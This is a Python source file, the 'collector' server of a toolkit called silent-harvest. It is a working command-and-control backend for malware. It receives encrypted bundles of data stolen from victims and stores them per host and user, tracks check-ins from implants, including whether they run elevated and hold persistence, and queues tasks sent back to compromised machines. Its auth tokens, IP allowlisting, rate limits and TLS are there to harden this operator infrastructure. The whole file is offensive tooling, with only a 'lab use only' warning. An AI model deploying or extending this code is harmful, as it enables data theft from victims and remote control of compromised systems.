"""silent-harvest collector — hardened loot receiver.

Usage:
    python collector.py [--port 8443] [--bind 0.0.0.0] [--psk SECRET]
                        [--auth TOKEN] [--allow 10.0.0.0/8,192.168.1.0/24]
                        [--max-body 128] [--rate 60] [--loot-dir ../loot]

Controls:
    --auth TOKEN   require header X-SH-Auth: TOKEN on every request
                   (compared in constant time; rejected before any reading)
    --allow LIST   comma-separated CIDRs / IPs allowed to connect
                   (default: any -- restrict this on an internet-facing host)
    --max-body MB  request body cap, default 128
    --rate N       max requests per source IP per minute, default 60
    --psk          pre-shared key (arg > env SH_PSK > psk.txt > dev key).
                   psk.txt is chmod 0600 on POSIX.

Endpoints:
    POST /gate   body = SHV1 container; stored under loot/<host>-<user>-<ts>/
    GET  /health liveness (also requires --auth when set)

Everything about the victim travels inside the encrypted container; the only
plaintext on the wire is the 6-byte header (magic+version). Access decisions
are logged to <loot-dir>/access.log.
"""
import argparse
import hmac
import ipaddress
import json
import os
import re
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

import shcrypto
import term

LOCK = threading.Lock()
RATE_LOCK = threading.Lock()
RATE = {}  # ip -> (window_start, count)
SESSION = {"accepted": 0, "rejected": 0, "denied": 0, "bytes": 0}


def rate_limited(ip, limit):
    now = time.time()
    with RATE_LOCK:
        start, count = RATE.get(ip, (now, 0))
        if now - start > 60:
            RATE[ip] = (now, 1)
            return False
        RATE[ip] = (start, count + 1)
        return count + 1 > limit


def ip_allowed(ip, networks):
    if not networks:
        return True
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(addr in net for net in networks)


def _load_json(path, default):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default


def _save_json(path, obj):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(obj, f, indent=2)
    os.replace(tmp, path)


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    timeout = 60  # dead/slow connections get dropped
    loot_dir = "loot"
    auth_token = None
    allow_nets = None
    max_body = 128 * 1024 * 1024
    rate_limit = 60
    access_log = None

    def log_message(self, fmt, *args):
        pass  # we do our own structured access logging

    def _access(self, verdict, extra=""):
        if self.access_log is None:
            return
        with LOCK:
            with open(self.access_log, "a") as f:
                f.write("%s %s %s %s %s %s\n" % (
                    time.strftime("%Y-%m-%dT%H:%M:%S"),
                    self.client_address[0], self.command, self.path,
                    verdict, extra))

    def _reply(self, code, body=b"ok\n", ctype="text/plain"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    # ---------------------------------------------------------- gatekeeping
    def _preflight(self):
        ip = self.client_address[0]
        if not ip_allowed(ip, self.allow_nets):
            self._access("DENY_SOURCE")
            self._reply(403, b"forbidden\n")
            return False
        if rate_limited(ip, self.rate_limit):
            self._access("RATE_LIMIT")
            self._reply(429, b"slow down\n")
            return False
        if self.auth_token is not None:
            supplied = self.headers.get("X-SH-Auth", "")
            if not hmac.compare_digest(supplied, self.auth_token):
                self._access("DENY_AUTH")
                self._reply(401, b"unauthorized\n")
                return False
        return True

    # ---------------------------------------------------------- handlers
    def do_GET(self):
        if not self._preflight():
            return
        if self.path in ("/health", "/"):
            self._access("OK")
            self._reply(200, b"silent-harvest collector up\n")
            return
        u = urlparse(self.path)
        if u.path == "/beacon":
            qs = {k: v[0] for k, v in parse_qs(u.query).items()}
            hid = re.sub(r"[^A-Za-z0-9_.-]", "_", qs.get("id", "unknown"))[:80]
            now = int(time.time())
            with LOCK:
                hosts = _load_json(os.path.join(self.loot_dir, "hosts.json"), {})
                h = hosts.setdefault(hid, {"first_seen": now, "beacons": 0})
                h.update({"last_seen": now, "version": qs.get("v", "?"),
                          "elevated": qs.get("e", "?"),
                          "persist": qs.get("p", "?"),
                          "beacons": h.get("beacons", 0) + 1})
                _save_json(os.path.join(self.loot_dir, "hosts.json"), hosts)
                task = None
                tpath = os.path.join(self.loot_dir, "tasks", hid + ".json")
                q = _load_json(tpath, [])
                if q:
                    task = q.pop(0)
                    _save_json(tpath, q)
            self._access("BEACON", "id=%s%s" % (hid, " task!" if task else ""))
            if task is None:
                self._reply(204, b"")
                return
            blob = shcrypto.pack([("task.json",
                                   json.dumps(task).encode(), None)],
                                 self.server.psk,
                                 victim_meta={"task": True})
            term.cprint("[%s] %s  task '%s' -> %s" % (
                time.strftime("%H:%M:%S"),
                term.s("⟡ TASK", term.C.MAGENTA, term.C.BOLD),
                term.s(str(task.get("id", "?")), term.C.BOLD),
                term.s(hid, term.C.CYAN)))
            sys.stdout.flush()
            self._reply(200, blob, ctype="application/octet-stream")
            return
        self._access("404")
        self._reply(404, b"nope\n")

    def do_POST(self):
        if not self._preflight():
            return
        if self.path != "/gate":
            self._access("404")
            self._reply(404, b"nope\n")
            return
        try:
            length = int(self.headers.get("Content-Length", "0"))
        except ValueError:
            length = -1
        if length <= 0 or length > self.max_body:
            self._access("BAD_LENGTH", "len=%s" % self.headers.get("Content-Length"))
            self._reply(400, b"bad length\n")
            return
        blob = self.rfile.read(length)
        if len(blob) != length:
            self._access("TRUNCATED")
            self._reply(400, b"short body\n")
            return
        try:
            manifest, parts = shcrypto.unpack(blob, self.server.psk)
        except ValueError as e:
            with LOCK:
                SESSION["rejected"] += 1
            term.cprint("[%s] ✗ REJECTED %s: %s" % (
                time.strftime("%H:%M:%S"), self.client_address[0], e), term.C.RED)
            self._access("REJECT_BUNDLE", str(e))
            self._reply(400, b"bad bundle\n")
            return

        v = manifest.get("victim", {})
        vid = "%s-%s-%d" % (
            re.sub(r"[^A-Za-z0-9_.-]", "_", str(v.get("host", "unknown"))),
            re.sub(r"[^A-Za-z0-9_.-]", "_", str(v.get("user", "unknown"))),
            int(v.get("ts", time.time())),
        )
        with LOCK:
            hosts = _load_json(os.path.join(self.loot_dir, "hosts.json"), {})
            hid = "%s-%s" % (re.sub(r"[^A-Za-z0-9_.-]", "_", str(v.get("host", "unknown"))),
                             re.sub(r"[^A-Za-z0-9_.-]", "_", str(v.get("user", "unknown"))))
            h = hosts.setdefault(hid, {"first_seen": int(time.time()), "beacons": 0})
            h.update({"last_seen": int(time.time()), "beacons": h.get("beacons", 0) + 1,
                      "elevated": v.get("elevated"), "persist": v.get("persist", "?")})
            _save_json(os.path.join(self.loot_dir, "hosts.json"), hosts)
        dest = os.path.join(self.loot_dir, vid)
        with LOCK:
            os.makedirs(os.path.join(dest, "parts"), exist_ok=True)
            with open(os.path.join(dest, "bundle.bin"), "wb") as f:
                f.write(blob)
            with open(os.path.join(dest, "manifest.json"), "w") as f:
                json.dump(manifest, f, indent=2)
            for name, data in parts.items():
                safe = re.sub(r"[^A-Za-z0-9_.()-]", "_", name)
                with open(os.path.join(dest, "parts", safe), "wb") as f:
                    f.write(data)
            with open(os.path.join(self.loot_dir, "index.jsonl"), "a") as f:
                f.write(json.dumps({
                    "id": vid, "ts": v.get("ts"),
                    "host": v.get("host"), "user": v.get("user"),
                    "elevated": v.get("elevated"),
                    "parts": [{"name": p["name"], "len": p["len"]}
                              for p in manifest["parts"]],
                }) + "\n")

        with LOCK:
            SESSION["accepted"] += 1
            SESSION["bytes"] += len(blob)
        term.cprint("[%s] %s %s  %s@%s%s  parts=%s  %s" % (
            time.strftime("%H:%M:%S"),
            term.s("✓ LOOT", term.C.GREEN, term.C.BOLD),
            term.s(vid, term.C.BOLD),
            v.get("user"), v.get("host"),
            term.s(" elev" if str(v.get("elevated")).lower() == "true" else "", term.C.YELLOW),
            term.s(str(len(parts)), term.C.BOLD),
            term.s(term.human_size(len(blob)), term.C.CYAN)))
        names = manifest["parts"]
        for i, p in enumerate(names):
            branch = "└─" if i == len(names) - 1 else "├─"
            meta_obj = p.get("meta") or {}          # may be null in C# manifests
            meta = json.dumps(meta_obj)
            method = ""
            if "method" in meta_obj:
                method = term.s("  " + meta_obj["method"], term.C.MAGENTA)
            term.cprint("     %s %-48s %10s  %s%s" % (
                term.s(branch, term.C.GREY),
                p["name"], term.s("%d" % p["len"], term.C.CYAN),
                term.s(meta[:60] + ("…" if len(meta) > 60 else ""), term.C.GREY),
                method))
        sys.stdout.flush()
        self._access("ACCEPT", "id=%s bytes=%d" % (vid, len(blob)))
        self._reply(200, b"ok\n")


class Server(ThreadingHTTPServer):
    daemon_threads = True
    request_queue_size = 32


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--psk", default=None)
    ap.add_argument("--auth", default=os.environ.get("SH_AUTH"),
                    help="require X-SH-Auth header with this token")
    ap.add_argument("--allow", default=None,
                    help="comma-separated CIDRs/IPs allowed to connect")
    ap.add_argument("--max-body", type=int, default=128,
                    help="max request body in MB (default 128)")
    ap.add_argument("--rate", type=int, default=60,
                    help="max requests per IP per minute (default 60)")
    ap.add_argument("--loot-dir", default=os.path.join(
        os.path.dirname(os.path.abspath(__file__)), "..", "loot"))
    ap.add_argument("--tls-cert", default=None, help="PEM cert to serve TLS")
    ap.add_argument("--tls-key", default=None, help="PEM private key for --tls-cert")
    args = ap.parse_args()

    psk = shcrypto.get_psk(args.psk)
    Handler.loot_dir = os.path.abspath(args.loot_dir)
    os.makedirs(Handler.loot_dir, exist_ok=True)
    os.makedirs(os.path.join(Handler.loot_dir, "tasks"), exist_ok=True)

    Handler.auth_token = args.auth
    Handler.max_body = args.max_body * 1024 * 1024
    Handler.rate_limit = args.rate
    Handler.access_log = os.path.join(Handler.loot_dir, "access.log")
    if args.allow:
        nets = []
        for c in args.allow.split(","):
            c = c.strip()
            if not c:
                continue
            try:
                nets.append(ipaddress.ip_network(c, strict=False))
            except ValueError:
                sys.exit("bad CIDR in --allow: %s" % c)
        Handler.allow_nets = nets

    # tighten the psk file on POSIX (no-op on Windows)
    if os.name == "posix":
        psk_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "psk.txt")
        if os.path.exists(psk_file):
            os.chmod(psk_file, 0o600)

    srv = Server((args.bind, args.port), Handler)
    srv.psk = psk
    if args.tls_cert and args.tls_key:
        import ssl
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(args.tls_cert, args.tls_key)
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    term.init()
    term.print_banner()
    print()

    banner = [
        "%s  %s:%d   loot → %s" % (
            term.s("bind", term.C.GREY), args.bind, args.port,
            term.s(Handler.loot_dir, term.C.CYAN)),
        "%s  %s   %s %s   %s %dMB   %s %d/min" % (
            term.s("auth", term.C.GREY),
            term.s("X-SH-Auth REQUIRED", term.C.GREEN) if args.auth
            else term.s("off (lab mode)", term.C.YELLOW),
            term.s("allow", term.C.GREY),
            term.s(args.allow, term.C.GREEN) if args.allow
            else term.s("any", term.C.YELLOW),
            term.s("max-body", term.C.GREY), args.max_body,
            term.s("rate", term.C.GREY), args.rate),
        "%s  %s" % (term.s("psk ", term.C.GREY),
                    "(arg)" if args.psk else "env SH_PSK / psk.txt / dev key"),
    ]
    if not args.auth or not args.allow:
        banner.append(term.s("WARN: no --auth / --allow — lab use only",
                             term.C.YELLOW, term.C.BOLD))
    for line in term.box(banner, title="silent-harvest collector", width=68):
        print(line)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    print()
    term.cprint("session summary: %s accepted  %s rejected  %s collected" % (
        term.s(str(SESSION["accepted"]), term.C.GREEN, term.C.BOLD),
        term.s(str(SESSION["rejected"]), term.C.RED),
        term.s(term.human_size(SESSION["bytes"]), term.C.CYAN)),
        term.C.BOLD)


if __name__ == "__main__":
    main()
